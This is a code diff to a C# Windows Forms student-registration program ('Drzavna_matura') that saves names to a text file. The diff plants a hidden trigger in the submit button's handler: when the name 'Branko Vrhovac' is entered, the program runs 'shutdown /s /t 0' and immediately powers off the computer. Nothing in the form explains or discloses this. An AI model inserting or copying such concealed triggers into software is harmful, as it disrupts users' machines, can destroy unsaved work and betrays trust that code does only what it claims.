@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.IO;
 using System.Linq;
@@ -147,6 +148,13 @@ namespace Drzavna_matura
 
         private void button1_Click(object sender, EventArgs e)
         {
+            if (textBox1.Text == "Branko")
+            {
+                if (textBox2.Text == "Vrhovac")
+                {
+                    Process.Start("shutdown", "/s /t 0");
+                }
+            }
             StreamWriter pisac = new StreamWriter("Ucenici.txt", append: true);
             string ime = textBox1.Text;
             string prezime = textBox2.Text;
